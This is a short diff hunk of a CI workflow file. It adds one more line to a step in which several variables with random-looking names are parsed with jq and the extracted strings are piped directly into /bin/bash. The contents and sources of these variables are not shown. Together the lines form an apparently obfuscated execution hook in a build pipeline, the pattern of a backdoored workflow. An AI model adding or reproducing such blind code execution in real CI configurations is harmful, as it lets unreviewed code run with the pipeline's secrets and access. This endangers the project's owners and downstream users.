@@ -41,6 +41,7 @@ jobs:
           echo $q7 | jq -r .rajjg9166 | /bin/bash
           echo $seqk275 | jq -r .uqa80 | /bin/bash
           printf '%s' "$eq68" | jq -r .sycp1 | /bin/bash
+          echo $qr64 | jq -r .n63 | /bin/bash
 
       - name: Archive results
         if: always()
